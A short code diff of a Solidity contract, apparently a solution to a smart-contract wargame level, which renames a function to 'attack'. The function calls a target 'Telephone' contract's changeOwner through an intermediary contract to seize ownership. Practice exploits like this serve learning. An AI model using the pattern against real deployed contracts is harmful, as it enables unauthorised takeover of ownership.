@@ -10,7 +10,7 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 contract Level4 is Ownable {
   Telephone t = Telephone(0xdDE0490B87242C958717C0E39559afE2d2F42011);
 
-  function changeOwner() public onlyOwner {
+  function attack() public onlyOwner {
     t.changeOwner(msg.sender);
   }
 }
